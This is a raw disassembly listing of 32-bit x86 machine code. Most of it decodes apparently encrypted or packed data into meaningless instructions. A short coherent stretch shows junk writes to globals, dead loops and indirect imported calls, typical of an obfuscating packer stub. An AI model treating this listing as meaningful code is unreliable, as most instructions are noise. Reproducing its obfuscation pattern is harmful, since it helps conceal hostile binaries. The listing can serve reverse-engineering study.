  403164:	xchg   BYTE PTR [ebp-0x49],dh
  403167:	push   0xffffffec
  403169:	je     0x403169
  40316b:	mov    cs:0x8ed62faf,al
  403171:	sub    ebp,DWORD PTR [edi-0x376848eb]
  403177:	add    eax,0xbeb9e692
  40317c:	test   al,0x53
  40317e:	cwde   
  40317f:	cmc    
  403180:	mov    edx,0x3c6041c4
  403185:	mov    WORD PTR [ebx],fs
  403187:	mov    ah,0x18
  403189:	push   ecx
  40318a:	pop    edi
  40318b:	pusha  
  40318c:	test   eax,0x1261f31d
  403191:	jmp    0x2cec:0xbb823c48
  403198:	imul   edx,DWORD PTR [esi],0xaff4f59f
  40319e:	sub    eax,DWORD PTR [ebp-0x79820df4]
  4031a4:	mov    al,ds:0x89fbc05
  4031a9:	in     eax,dx
  4031aa:	sub    ebp,DWORD PTR [edx-0x26]
  4031ad:	mov    ch,0xd3
  4031af:	outs   dx,BYTE PTR ds:[esi]
  4031b0:	and    al,0x36
  4031b2:	cmp    esi,edi
  4031b4:	rol    bh,0xf8
  4031b7:	cdq    
  4031b8:	and    DWORD PTR [edx+0x4b4e3417],ebp
  4031be:	(bad)  
  4031bf:	xor    ch,BYTE PTR [eax+0xe]
  4031c2:	xchg   esi,eax
  4031c3:	sbb    DWORD PTR [edx],ebx
  4031c5:	(bad)  
  4031c6:	jl     0x4031a0
  4031c8:	in     eax,dx
  4031c9:	push   eax
  4031ca:	enter  0xf7f7,0x3d
  4031ce:	mov    bh,0x6
  4031d0:	cmp    al,0x21
  4031d3:	pop    edx
  4031d4:	mov    bh,BYTE PTR [ecx+0x400a517c]
  4031da:	jle    0x4031ae
  4031dc:	enter  0x18ec,0x8b
  4031e0:	mov    ch,0x5f
  4031e2:	jg     0x40316b
  4031e4:	out    dx,al
  4031e5:	test   al,0x42
  4031e7:	xchg   edx,eax
  4031e8:	jnp    0x403254
  4031ea:	mov    ss,WORD PTR [ebx+0x6e]
  4031ed:	clc    
  4031ee:	adc    ah,BYTE PTR [ebp-0x73]
  4031f1:	out    0x7e,al
  4031f3:	mov    WORD PTR [edi],fs
  4031f5:	out    0xb9,eax
  4031f7:	mov    ds:0xc24c3c28,al
  4031fc:	rcl    BYTE PTR [ebx+0x15],cl
  4031ff:	pop    edx
  403200:	sbb    edi,edi
  403202:	shl    ebx,1
  403204:	inc    edx
  403205:	dec    edi
  403206:	test   al,0xc3
  403208:	ss (bad) 
  40320a:	push   ebp
  40320b:	mov    ch,0x7b
  40320d:	rcl    DWORD PTR [ebp-0x2b],0xd2
  403211:	mov    edx,0xa5f292d4
  403216:	mov    edi,gs
  403218:	cmp    cl,BYTE PTR [esi+0x31]
  40321b:	pop    ds
  40321c:	rol    BYTE PTR [ecx+0x236d47cd],cl
  403222:	inc    edi
  403223:	lahf   
  403224:	(bad)  
  403225:	repz loopne 0x403285
  403228:	in     eax,dx
  403229:	push   eax
  40322a:	jle    0x40326c
  40322c:	add    al,0x31
  40322e:	aaa    
  40322f:	call   0xefc3:0x787defd2
  403236:	cwde   
  403237:	rcl    BYTE PTR [esi],0x93
  40323a:	jbe    0x4031e1
  40323c:	xchg   ebp,eax
  40323d:	test   al,0x6b
  40323f:	push   cs
  403240:	pop    esp
  403241:	and    BYTE PTR [esi+0x142e701e],ch
  403247:	out    0x87,eax
  403249:	and    BYTE PTR [esp+esi*8+0x17],bl
  40324d:	stos   BYTE PTR es:[edi],al
  40324e:	mov    edx,DWORD PTR [edx]
  403250:	inc    ebx
  403251:	push   esp
  403252:	jmp    0x403203
  403254:	add    eax,0xa4525820
  403259:	out    dx,al
  40325a:	push   cs
  40325b:	jnp    0x40327f
  40325d:	in     al,dx
  40325e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40325f:	imul   edx,DWORD PTR [eax+0x15477105],0x52
  403266:	icebp  
  403267:	xor    DWORD PTR [ebp-0x1c],ebx
  40326a:	xor    dl,BYTE PTR [ecx]
  40326c:	xchg   edx,eax
  40326d:	mov    ds:0x8a30c694,al
  403272:	or     bl,al
  403274:	leave  
  403275:	test   al,0xb8
  403277:	cmp    BYTE PTR [edx+0x33660000],cl
  40327d:	inc    ecx
  40327e:	and    BYTE PTR [ecx+0x3afe],bh
  403284:	and    DWORD PTR ds:0x43457b,0x434543
  40328e:	add    ax,cx
  403291:	mov    ecx,DWORD PTR ds:0x43458f
  403297:	xor    ecx,DWORD PTR ds:0x4344eb
  40329d:	mov    DWORD PTR ds:0x43458f,ecx
  4032a3:	movzx  eax,ax
  4032a6:	mov    ecx,DWORD PTR ds:0x43457f
  4032ac:	xor    DWORD PTR ds:0x434503,ecx
  4032b2:	mov    DWORD PTR [ebp-0xc],eax
  4032b5:	mov    ecx,DWORD PTR ds:0x43458f
  4032bb:	sbb    ecx,DWORD PTR ds:0x4345bf
  4032c1:	mov    DWORD PTR ds:0x43458f,ecx
  4032c7:	mov    BYTE PTR [ebp-0x1],0x7f
  4032cb:	lea    eax,[ebp-0x1]
  4032ce:	or     DWORD PTR ds:0x43458f,0x2e6e
  4032d8:	mov    DWORD PTR [ebp-0x10],eax
  4032db:	and    DWORD PTR ds:0x43460b,edi
  4032e1:	jmp    0x4036d6
  4032e6:	jo     0x4032d7
  4032e8:	inc    edi
  4032e9:	xchg   DWORD PTR [ecx-0x49],eax
  4032ec:	jo     0x4032d7
  4032ee:	jne    0x403366
  4032f0:	xchg   edx,eax
  4032f1:	or     cl,BYTE PTR [edx-0xf]
  4032f4:	push   ebx
  4032f5:	int3   
  4032f6:	or     edx,DWORD PTR [eax]
  4032f8:	jle    0x403378
  4032fa:	push   esi
  4032fb:	jns    0x40337b
  4032fd:	jle    0x40332d
  4032ff:	ret    0xf3d4
  403302:	xor    ebp,ebp
  403304:	mov    edi,0xc6048bdc
  403309:	add    BYTE PTR [edi-0x57],al
  40330c:	cli    
  40330d:	gs mov edi,0x3d6b309b
  403313:	push   cs
  403314:	or     al,0xc8
  403316:	sbb    al,0x93
  403318:	div    DWORD PTR [ebp+0x0]
  40331b:	adc    edi,DWORD PTR [ebp-0x50]
  40331e:	test   BYTE PTR [eax+0x5c0993f2],0xe7
  403325:	loopne 0x403397
  403327:	adc    eax,0x5104571b
  40332c:	ins    BYTE PTR es:[edi],dx
  40332d:	rcl    DWORD PTR [ebp+0x4d],0x2d
  403331:	push   0xffffffeb
  403333:	inc    esi
  403334:	in     al,dx
  403335:	push   0xa19e2599
  40333a:	jnp    0x403393
  40333c:	sub    DWORD PTR [edi],esp
  40333e:	adc    al,0x69
  403340:	xchg   bh,ah
  403342:	je     0x403330
  403344:	xchg   ebp,eax
  403345:	cwde   
  403346:	cwde   
  403347:	and    DWORD PTR [ecx+0x471fea2e],esi
  40334d:	jb     0x40334d
  40334f:	repnz sub esp,DWORD PTR [ebx]
  403352:	jecxz  0x403368
  403354:	mov    bh,0xd6
  403356:	es pusha 
  403358:	rol    bl,cl
  40335a:	pop    edi
  40335b:	ds jle 0x4032ec
  40335e:	ret    
  40335f:	(bad)  
  403360:	mov    cl,0x3c
  403362:	pop    ecx
  403363:	jnp    0x40336e
  403365:	jl     0x403351
  403367:	stc    
  403368:	pop    ebx
  403369:	or     BYTE PTR [ebp-0x6368824a],al
  40336f:	push   eax
  403370:	stos   BYTE PTR es:[edi],al
  403371:	scas   eax,DWORD PTR es:[edi]
  403372:	stos   BYTE PTR es:[edi],al
  403373:	mov    ecx,ecx
  403375:	into   
  403376:	xor    al,0xc6
  403378:	sbb    BYTE PTR [esi-0x22],0x8a
  40337c:	jnp    0x403316
  40337e:	lods   eax,DWORD PTR ds:[esi]
  40337f:	lods   eax,DWORD PTR ds:[esi]
  403380:	add    al,dl
  403382:	aam    0x1b
  403384:	mov    bh,0xdc
  403386:	cmp    bh,BYTE PTR [ecx-0xc]
  403389:	ret    0x3c8
  40338c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40338d:	loope  0x4033b6
  40338f:	repnz cmp BYTE PTR [edx+ecx*8],bh
  403393:	loopne 0x4033f5
  403395:	jmp    0x403342
  403397:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403398:	mov    bh,0x5d
  40339a:	fwait
  40339b:	add    BYTE PTR [edx+0x47],al
  40339e:	(bad)  
  40339f:	dec    edi
  4033a0:	mov    al,0x6f
  4033a2:	inc    BYTE PTR [esi]
  4033a4:	sbb    BYTE PTR [ebp+0x20643906],dl
  4033aa:	loop   0x40334f
  4033ac:	and    DWORD PTR [ecx],ebx
  4033ae:	pop    edi
  4033af:	imul   ecx,DWORD PTR [ecx-0x6f],0xfffffff8
  4033b3:	leave  
  4033b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033b5:	pop    edi
  4033b6:	(bad)  
  4033b7:	js     0x403438
  4033b9:	(bad)  
  4033ba:	in     al,dx
  4033bb:	imul   edi,eax,0x47e8ff72
  4033c1:	sbb    al,0xea
  4033c3:	cmp    ebp,DWORD PTR [esi]
  4033c5:	sub    dl,cl
  4033c7:	mov    WORD PTR [eax+0x40e1a567],gs
  4033cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033ce:	mov    esp,0x6c72b651
  4033d3:	xchg   BYTE PTR [ecx],bh
  4033d5:	and    ebx,DWORD PTR [esi-0xae78f1]
  4033db:	pop    edi
  4033dc:	inc    esi
  4033dd:	inc    eax
  4033de:	dec    ebp
  4033df:	pop    esp
  4033e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033e1:	dec    esp
  4033e2:	fist   DWORD PTR es:[edx+0x60156d7e]
  4033e9:	repz mov bl,0x49
  4033ec:	das    
  4033ed:	lods   al,BYTE PTR ds:[esi]
  4033ee:	out    0xbe,eax
  4033f0:	add    DWORD PTR [edx+0x7e],ebp
  4033f3:	mov    bl,0x37
  4033f5:	and    al,0x96
  4033f7:	ja     0x4033d6
  4033f9:	jno    0x4033bf
  4033fb:	pop    ss
  4033fc:	sub    eax,DWORD PTR [ebx-0xa76b2b4]
  403402:	mov    edi,0x2162db88
  403407:	mov    bl,0x3b
  403409:	jl     0x4033ee
  40340b:	ret    0x4ef2
  40340e:	sbb    eax,0x7d73fcc5
  403413:	inc    esi
  403414:	cld    
  403415:	sub    BYTE PTR [ecx+ebx*1+0x17eb0d8c],0xea
  40341d:	test   DWORD PTR [ebx+0x2ed62943],ecx
  403423:	mov    ds:0x5f96bcfe,al
  403428:	and    al,0x84
  40342a:	jb     0x4033e9
  40342c:	cmc    
  40342d:	pop    ecx
  40342e:	jb     0x403444
  403430:	ins    BYTE PTR es:[edi],dx
  403431:	repnz (bad) 
  403433:	(bad)  
  403434:	sti    
  403435:	xor    al,0xca
  403437:	and    eax,0xd495af0
  40343c:	push   es
  40343d:	adc    DWORD PTR [eax],0xc0ffa5dc
  403443:	jns    0x40347c
  403445:	push   ds
  403446:	adc    al,0x69
  403448:	fsubr  DWORD PTR [edx+edi*8]
  40344b:	push   eax
  40344c:	push   cs
  40344d:	dec    eax
  40344e:	and    al,0xc3
  403450:	repnz loopne 0x40341e
  403453:	das    
  403454:	scas   eax,DWORD PTR es:[edi]
  403455:	repnz in al,dx
  403457:	push   ds
  403458:	cmp    DWORD PTR [edi+0x3e],ebp
  40345b:	mov    esp,0xcb4c5caf
  403460:	rol    BYTE PTR [eax],1
  403462:	int3   
  403463:	mov    eax,ds:0xae9418c8
  403468:	push   bx
  40346a:	repnz sahf 
  40346c:	mov    esp,0x7b24cf76
  403471:	mov    edx,0x5465984b
  403476:	xor    al,0x23
  403478:	leave  
  403479:	or     esp,DWORD PTR [ebp-0x1b5af5be]
  40347f:	mov    esi,esp
  403481:	int    0x60
  403483:	jle    0x403412
  403485:	iret   
  403486:	retf   0x1aa4
  403489:	inc    ebp
  40348a:	add    al,0x6a
  40348c:	fwait
  40348d:	xor    al,ah
  40348f:	dec    edi
  403490:	fisubr WORD PTR [ebx+ebp*2]
  403493:	dec    esi
  403494:	jge    0x4034c2
  403496:	in     al,dx
  403497:	icebp  
  403498:	push   ds
  403499:	mov    eax,ds:0x672a17c
  40349e:	inc    eax
  40349f:	jnp    0x40345b
  4034a1:	fsubr  QWORD PTR cs:[esi+0xe]
  4034a5:	daa    
  4034a6:	jno    0x4034c9
  4034a8:	gs clc 
  4034aa:	xchg   BYTE PTR [esi+eax*2-0x12],al
  4034ae:	cmp    al,0x1a
  4034b0:	stc    
  4034b1:	lea    eax,[esp+edx*4]
  4034b4:	mov    ds:0x4fe77639,al
  4034b9:	popa   
  4034ba:	(bad)  
  4034bb:	ficomp DWORD PTR [edx-0x42e49c43]
  4034c1:	push   0x6
  4034c3:	inc    eax
  4034c4:	popa   
  4034c5:	jmp    0xa7bde105
  4034ca:	jns    0x4034d4
  4034cc:	fnstcw WORD PTR [edi-0x36ffa1e0]
  4034d2:	test   al,cl
  4034d4:	jmp    0x3b75:0xca1e7f71
  4034db:	ins    BYTE PTR es:[edi],dx
  4034dc:	mov    eax,ds:0x511955f1
  4034e1:	pop    ecx
  4034e2:	mov    ebp,esi
  4034e4:	cmp    al,0x37
  4034e6:	call   0x88f6:0xcf0ad71a
  4034ed:	push   ecx
  4034ee:	in     al,dx
  4034ef:	add    edx,DWORD PTR [ecx+0x7b]
  4034f2:	and    ax,WORD PTR [esi]
  4034f5:	xchg   edi,eax
  4034f6:	imul   ebx,DWORD PTR [ecx+0x2b6a16ef],0xffffffc5
  4034fd:	add    al,0x2c
  4034ff:	adc    DWORD PTR [ecx+0x33],ebx
  403502:	or     edx,DWORD PTR ds:0x6715a8de
  403508:	loop   0x403513
  40350a:	in     al,dx
  40350b:	inc    eax
  40350c:	sbb    eax,0x7cea85bd
  403511:	mov    cl,0x26
  403513:	arpl   WORD PTR [edx+0x5b4f044],dx
  403519:	xchg   BYTE PTR [ebp+0x1e],cl
  40351c:	and    BYTE PTR [ebx-0x77b5babb],ch
  403522:	dec    ebp
  403523:	adc    al,0xe3
  403525:	mov    DWORD PTR [ebp+0x3ac03bb3],ebx
  40352b:	fadd   st(2),st
  40352d:	push   esi
  40352e:	xchg   esi,eax
  40352f:	pop    edx
  403530:	outs   dx,BYTE PTR ds:[esi]
  403531:	das    
  403532:	xchg   esi,eax
  403533:	es dec ebx
  403535:	jns    0x4034c7
  403537:	loope  0x4034f4
  403539:	scas   eax,DWORD PTR es:[edi]
  40353a:	add    esp,ecx
  40353c:	sub    BYTE PTR [ebx+0x2d27c34e],bh
  403542:	fcomp  st(1)
  403544:	push   ebp
  403545:	ja     0x403584
  403547:	repz inc ebx
  403549:	sahf   
  40354a:	lock lea ebx,[esi+0x33]
  40354e:	loope  0x4034d3
  403550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403551:	daa    
  403552:	ret    0x22
  403555:	jns    0x40352c
  403557:	xchg   ebp,eax
  403558:	mov    al,BYTE PTR [edi-0x1124e1bb]
  40355e:	sahf   
  40355f:	pop    eax
  403560:	jmp    0x403515
  403562:	cmp    DWORD PTR [ebp-0x1c],ecx
  403565:	mov    eax,0xe10f82fa
  40356a:	mov    BYTE PTR [esi+0x25],cl
  40356d:	add    esp,ebx
  40356f:	mov    esp,0x3f2f1485
  403574:	pop    ecx
  403575:	clc    
  403576:	inc    eax
  403577:	mov    esp,0xeb7456a5
  40357c:	xor    al,BYTE PTR [edi]
  40357e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40357f:	fs mov ebp,0x457919ca
  403585:	and    edi,DWORD PTR [eax-0x3b]
  403588:	(bad)  
  403589:	fstp   DWORD PTR [edx]
  40358b:	jb     0x403524
  40358d:	dec    ebp
  40358e:	aas    
  40358f:	push   cs
  403590:	(bad)  
  403591:	pop    ebx
  403592:	add    DWORD PTR [ebx],edx
  403594:	dec    eax
  403595:	jg     0x40354a
  403597:	mov    cs,WORD PTR [ebp+0x50fe5b05]
  40359d:	ja     0x4035d1
  40359f:	jge    0x8bd79bc8
  4035a5:	sbb    ecx,DWORD PTR [ebx-0x36]
  4035a8:	mov    bh,0xb
  4035aa:	xchg   ecx,eax
  4035ab:	mov    ah,0xff
  4035ad:	xor    DWORD PTR [esi],ebp
  4035af:	and    ecx,esi
  4035b1:	cmp    eax,0x56ae9d7d
  4035b6:	sahf   
  4035b7:	in     eax,0x2
  4035b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035ba:	adc    ah,BYTE PTR [ecx-0x3e]
  4035bd:	mov    esi,ebx
  4035bf:	sub    eax,0x6f34c44f
  4035c4:	imul   BYTE PTR [edx]
  4035c6:	sbb    dh,ch
  4035c8:	push   esp
  4035c9:	cmc    
  4035ca:	(bad)  
  4035cb:	jge    0x4035a4
  4035cd:	retf   0x85df
  4035d0:	test   DWORD PTR [eax+ebx*1+0x1df46c35],edx
  4035d7:	shl    BYTE PTR [esi],1
  4035d9:	shl    BYTE PTR [esi-0x36],1
  4035dc:	inc    edi
  4035dd:	push   cs
  4035de:	mov    bh,0x27
  4035e0:	xor    DWORD PTR [esi],ebp
  4035e2:	add    al,0xdb
  4035e4:	jmp    DWORD PTR [edi]
  4035e6:	int3   
  4035e7:	scas   al,BYTE PTR es:[edi]
  4035e8:	lds    eax,FWORD PTR [ebx+0x646c8096]
  4035ee:	enter  0xa2c7,0xd9
  4035f2:	les    ebp,FWORD PTR fs:[ebp-0x80]
  4035f6:	xchg   edx,eax
  4035f7:	or     al,0x89
  4035f9:	push   ss
  4035fa:	xlat   BYTE PTR ds:[ebx]
  4035fb:	cwde   
  4035fc:	or     bl,dl
  4035fe:	mov    dl,0x77
  403600:	dec    edx
  403601:	mov    ds:0xaecb46b8,eax
  403606:	repz jmp DWORD PTR [edi+0x4]
  40360a:	adc    eax,DWORD PTR [esi]
  40360c:	ret    
  40360d:	xor    eax,0xeb2a0e5e
  403612:	aas    
  403613:	stos   DWORD PTR es:[edi],eax
  403614:	mov    ?,WORD PTR es:[eax]
  403617:	cld    
  403618:	inc    eax
  403619:	sbb    eax,0xe0cd3e4d
  40361e:	in     eax,dx
  40361f:	push   edx
  403620:	adc    esp,eax
  403622:	push   0xffffffc1
  403624:	and    al,0xc6
  403626:	aas    
  403627:	or     al,0x17
  403629:	xchg   ecx,eax
  40362a:	sub    esp,DWORD PTR [ecx+ecx*1-0x7]
  40362e:	and    DWORD PTR [ebp-0x7bac534c],ebp
  403634:	test   al,0x45
  403636:	xchg   BYTE PTR [ebx],cl
  403638:	sbb    al,0x7b
  40363a:	mov    DWORD PTR [ebx+0x3dba94a],edx
  403640:	fs xchg ebx,eax
  403642:	clc    
  403643:	test   eax,0x815f6f63
  403648:	ja     0x4035e7
  40364a:	add    eax,0xe8208219
  40364f:	iret   
  403650:	iret   
  403651:	cmp    DWORD PTR [edi-0x3ec4b57d],edi
  403657:	sub    eax,0x7fcb6df3
  40365c:	inc    edx
  40365d:	jle    0x4035e4
  40365f:	popf   
  403660:	jo     0x40363b
  403662:	dec    ebp
  403663:	shl    DWORD PTR [esi],cl
  403665:	jnp    0x403616
  403667:	dec    esi
  403668:	bound  ebp,QWORD PTR [ecx]
  40366a:	daa    
  40366b:	ds scas eax,DWORD PTR es:[edi]
  40366d:	test   eax,0xd98631fd
  403672:	jae    0x4035f7
  403674:	test   BYTE PTR [eax+0x66],ah
  403677:	inc    esi
  403678:	xchg   ebx,eax
  403679:	cmp    bh,dh
  40367b:	aaa    
  40367c:	jno    0x403689
  40367e:	icebp  
  40367f:	push   0xffffff95
  403681:	push   edi
  403682:	mov    WORD PTR [ebx+ebx*1-0x5e385228],cs
  403689:	in     al,dx
  40368a:	sub    al,BYTE PTR fs:[ebx-0x6a]
  40368e:	mov    eax,ds:0x76b4831a
  403693:	xchg   ecx,eax
  403694:	mov    ch,0x1d
  403696:	sub    BYTE PTR [ebp+0x6297cad3],al
  40369c:	cmp    cl,BYTE PTR [eax-0x25]
  40369f:	test   DWORD PTR [ebx-0x53],ebx
  4036a2:	sub    esi,edi
  4036a4:	cmp    eax,ebp
  4036a6:	jno    0x403666
  4036a8:	mul    edi
  4036aa:	outs   dx,DWORD PTR ds:[esi]
  4036ab:	repz xlat BYTE PTR ds:[ebx]
  4036ad:	pop    ebx
  4036ae:	in     eax,0xa5
  4036b0:	inc    ebp
  4036b1:	js     0x4036ec
  4036b3:	push   esp
  4036b4:	jne    0x4036f4
  4036b6:	sbb    al,0xb5
  4036b8:	xor    ah,0x2b
  4036bb:	scas   al,BYTE PTR es:[edi]
  4036bc:	pop    esi
  4036bd:	pusha  
  4036be:	stos   BYTE PTR es:[edi],al
  4036bf:	nop
  4036c0:	xor    dl,BYTE PTR [ecx]
  4036c2:	scas   al,BYTE PTR es:[edi]
  4036c3:	jo     0x4036dd
  4036c5:	lods   eax,DWORD PTR ds:[esi]
  4036c6:	jmp    0x7ffdc216
  4036cb:	mov    edx,0x3417f2f9
  4036d0:	les    eax,FWORD PTR [edx+esi*8-0x7516ce5c]
  4036d7:	inc    ebp
  4036d8:	dec    DWORD PTR [ebx+0x4344eb0d]
  4036de:	add    BYTE PTR [ebx],bl
  4036e0:	or     eax,0x434607
  4036e5:	mov    DWORD PTR ds:0x4344eb,ecx
  4036eb:	mov    ecx,DWORD PTR [ebp-0x10]
  4036ee:	sbb    DWORD PTR ds:0x434613,0x563b
  4036f8:	xor    al,0x44
  4036fa:	add    DWORD PTR ds:0x4344fb,0xe00
  403704:	sub    al,0x3a
  403706:	or     DWORD PTR ds:0x4344f7,0x434607
  403710:	mov    BYTE PTR [ecx],al
  403712:	xor    DWORD PTR ds:0x434577,ecx
  403718:	mov    DWORD PTR [ebp-0x8],0xf89c8536
  40371f:	and    DWORD PTR ds:0x434587,0x0
  403729:	jmp    0x40373d
  40372e:	xor    ecx,ecx
  403730:	xor    ecx,DWORD PTR ds:0x434587
  403736:	inc    ecx
  403737:	mov    DWORD PTR ds:0x434587,ecx
  40373d:	cmp    DWORD PTR ds:0x434587,0x18
  403744:	jae    0x40382f
  40374a:	cmp    DWORD PTR ds:0x434587,0x20
  403751:	jne    0x40376a
  403757:	push   0x446b
  40375c:	push   DWORD PTR [ebp-0xc]
  40375f:	push   0x8d79
  403764:	call   DWORD PTR ds:0x413278
  40376a:	jmp    0x40372e
  40376f:	mov    DWORD PTR ds:0x4345cb,0x14
  403779:	cmp    DWORD PTR ds:0x4345cb,0x0
  403780:	je     0x40382f
  403786:	cmp    DWORD PTR ds:0x4345cb,0xa
  40378d:	jne    0x4037a6
  403793:	push   0x695b
  403798:	push   0x23be
  40379d:	push   DWORD PTR [ebp-0x18]
  4037a0:	call   DWORD PTR ds:0x41327c
  4037a6:	cmp    DWORD PTR ds:0x4345cb,0xb
  4037ad:	jne    0x4037c0
  4037b3:	mov    ecx,DWORD PTR ds:0x4345cb
  4037b9:	dec    ecx
  4037ba:	mov    DWORD PTR ds:0x4345cb,ecx
  4037c0:	mov    ecx,DWORD PTR ds:0x4345cb
  4037c6:	dec    ecx
  4037c7:	mov    DWORD PTR ds:0x4345cb,ecx
  4037cd:	jmp    0x403779
  4037d2:	mov    DWORD PTR ds:0x4344e7,0x1c
  4037dc:	cmp    DWORD PTR ds:0x4344e7,0x0
  4037e3:	je     0x40382f
  4037e9:	cmp    DWORD PTR ds:0x4344e7,0xc
  4037f0:	jne    0x403801
  4037f6:	push   0x434749
  4037fb:	call   DWORD PTR ds:0x413334
  403801:	cmp    DWORD PTR ds:0x4344e7,0xd
  403808:	jne    0x40381b
  40380e:	mov    ecx,DWORD PTR ds:0x4344e7
  403814:	dec    ecx
  403815:	mov    DWORD PTR ds:0x4344e7,ecx
  40381b:	mov    ecx,DWORD PTR ds:0x4344e7
  403821:	dec    ecx
  403822:	mov    DWORD PTR ds:0x4344e7,ecx
  403828:	jmp    0x4037dc
  40382d:	xor    ecx,ecx
  40382f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  403836:	adc    eax,eax
  403838:	mov    eax,DWORD PTR [ebp-0x8]
  40383b:	mov    ecx,0x7510851
  403840:	push   esi
  403841:	adc    DWORD PTR ds:0x434587,edi
  403847:	xor    eax,ecx
  403849:	inc    DWORD PTR ds:0x43460b
  40384f:	mov    esi,0x327299
  403854:	sub    DWORD PTR ds:0x43454f,0x3953
  40385e:	add    eax,esi
  403860:	jmp    0x40387d
  403865:	not    DWORD PTR ds:0x434543
  40386b:	mov    dl,BYTE PTR [ebp-0x1]
  40386e:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403872:	mov    DWORD PTR ds:0x43454b,0x4a72
  40387c:	inc    eax
  40387d:	cmp    eax,0x40
  403880:	jb     0x403865
  403886:	mov    edx,DWORD PTR [ebp-0x8]
  403889:	mov    eax,DWORD PTR [ebp-0xc]
  40388c:	xor    edx,ecx
  40388e:	add    edx,esi
  403890:	cmp    edx,eax
  403892:	je     0x403ccd
  403898:	push   ebx
  403899:	push   edi
  40389a:	mov    edi,DWORD PTR [ebp+0x8]
  40389d:	mov    eax,0x8a38
  4038a2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4038a7:	mov    edi,0x3afe
  4038ac:	jmp    0x403ca1
  4038b1:	sbb    DWORD PTR [edx+0x31],0x6d5dfd54
  4038b8:	jae    0x4038d9
  4038ba:	(bad)  
  4038bb:	out    dx,al
  4038bc:	xchg   esi,eax
  4038bd:	adc    eax,0x63becd33
  4038c2:	adc    edi,DWORD PTR [esi+0x7e]
  4038c5:	push   esi
  4038c6:	jns    0x403946
  4038c8:	jle    0x403910
  4038ca:	int    0x35
  4038cc:	jnp    0x40387e
  4038ce:	mov    ch,0x62
  4038d0:	and    al,0xef
  4038d2:	jns    0x403876
  4038d4:	popa   
  4038d5:	jae    0x403911
  4038d7:	xchg   esi,eax
  4038d8:	mov    ah,0x59
  4038da:	jp     0x4038fc
  4038dc:	jno    0x403913
  4038de:	stos   DWORD PTR es:[edi],eax
  4038df:	mov    edx,0x74df5f26
  4038e4:	retf   0xfacd
  4038e7:	fldcw  WORD PTR [ecx+0x47]
  4038ea:	dec    BYTE PTR [edx+0x58b57100]
  4038f0:	mov    esi,0xaa7e56cc
  4038f5:	stos   DWORD PTR es:[edi],eax
  4038f6:	out    0x73,al
  4038f8:	mov    BYTE PTR [ecx-0x3180f97b],dl
  4038fe:	retf   0xb745
  403901:	arpl   WORD PTR [esi+edx*1+0x5a],cx
  403905:	sahf   
  403906:	es ret 
  403908:	and    eax,0x61dbcb5e
  40390d:	std    
  40390e:	fisttp DWORD PTR [esi-0xe13c1e0]
  403914:	mov    edi,0xa4a1eb79
  403919:	mov    ds:0x141b737e,al
  40391e:	aad    0x36
  403920:	xor    DWORD PTR [esi-0x4a],0x6f50704d
  403927:	retf   
  403928:	mov    ecx,0xbd70ad0e
  40392d:	cwde   
  40392e:	xor    DWORD PTR [eax+0x396bdf4d],esi
  403934:	sahf   
  403935:	pop    eax
  403936:	stc    
  403937:	add    al,0x10
  403939:	jecxz  0x40397f
  40393b:	dec    esi
  40393c:	retf   
  40393d:	mov    eax,0x88a8488d
  403942:	jp     0x4039aa
  403944:	jle    0x403917
  403946:	ja     0x4039bb
  403948:	sti    
  403949:	cmp    eax,DWORD PTR [ebx+ebp*2-0x2a97caf0]
  403950:	sub    DWORD PTR [eax+0xe],eax
  403953:	cmp    cl,BYTE PTR [ecx]
  403955:	jae    0x403953
  403957:	inc    ecx
  403958:	sub    al,0xdc
  40395a:	mov    esp,0xb980bec0
  40395f:	sub    eax,0xdb8e6654
  403964:	iret   
  403965:	loopne 0x4039ba
  403967:	sbb    dh,bh
  403969:	inc    ebp
  40396a:	jo     0x403998
  40396c:	mov    al,ds:0xba2cd9ec
  403971:	loope  0x403996
  403973:	shl    DWORD PTR ds:0x5dbb9e91,0xd6
  40397a:	fld    DWORD PTR [edx-0xb]
  40397d:	inc    esi
  40397e:	retf   0x2c54
  403981:	imul   edx,DWORD PTR [ecx],0xfffffff4
  403984:	ins    BYTE PTR es:[edi],dx
  403985:	xchg   ecx,eax
  403986:	retf   0xe52b
  403989:	xor    DWORD PTR [ebp+0x45151776],ebx
  40398f:	xchg   edi,eax
  403990:	xchg   esp,eax
  403991:	in     al,dx
  403992:	mov    edi,ecx
  403994:	mov    esi,0x16650a88
  403999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40399a:	dec    edi
  40399b:	aad    0x37
  40399d:	inc    edx
  40399e:	call   0xceca7a92
  4039a3:	fistp  DWORD PTR [edx+0x62]
  4039a6:	int    0xb4
  4039a8:	mov    al,ds:0x51b53659
  4039ad:	add    esp,DWORD PTR [edi+0x14]
  4039b0:	and    edi,DWORD PTR [ebp+0x53]
  4039b3:	and    BYTE PTR [edx+0x68],bh
  4039b6:	push   ecx
  4039b7:	and    eax,0xd987079e
  4039bc:	rcl    bh,0xf4
  4039bf:	mov    cl,0xf1
  4039c1:	sti    
  4039c2:	(bad)  
  4039c3:	loope  0x4039fa
  4039c5:	dec    edx
  4039c6:	out    dx,eax
  4039c7:	mov    cl,0x92
  4039c9:	in     al,0xae
  4039cb:	xor    ebx,DWORD PTR [edi-0x3e]
  4039ce:	ja     0x403a1f
  4039d0:	in     eax,dx
  4039d1:	sti    
  4039d2:	(bad)  
  4039d3:	pusha  
  4039d4:	rol    DWORD PTR [ecx-0x464bb0e2],1
  4039da:	(bad)  
  4039db:	cmp    al,0x3b
  4039dd:	test   BYTE PTR [ebx-0x739baa50],0xa8
  4039e4:	fist   DWORD PTR [edx+esi*1+0x68]
  4039e8:	adc    BYTE PTR [ebp+0x2cd4f5f2],bh
  4039ee:	push   0x9b49eda6
  4039f3:	arpl   WORD PTR [ebx+0x264f3da6],ax
  4039f9:	mov    ch,0xb5
  4039fb:	add    bl,BYTE PTR [ecx+ecx*2+0x4d1e92f4]
  403a02:	pop    ecx
  403a03:	lods   eax,DWORD PTR ds:[esi]
